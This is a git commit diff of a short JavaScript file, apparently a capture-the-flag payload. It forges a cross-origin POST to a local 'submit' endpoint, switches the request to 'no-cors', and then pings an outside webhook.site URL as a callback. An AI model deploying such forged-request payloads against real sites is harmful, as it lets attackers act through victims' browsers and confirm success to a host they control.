271950806ca3ec762a17fa8c3f0e764a16181534
alueft <anguslim94@gmail.com>
2022-10-26 23:13:46 -0400

    Update wow.js

--- wow.js
+++ wow.js
@@ -6,5 +6,5 @@ fetch("http://localhost:1337/api/submit", {
         trick_or_treat: "asdf",
     }),
     "method": "POST",
-    "mode": "cors",
+    "mode": "no-cors",
 }).then(fetch("https://webhook.site/878378ff-f7bd-4e60-bf6c-74d2012dc9a4"));
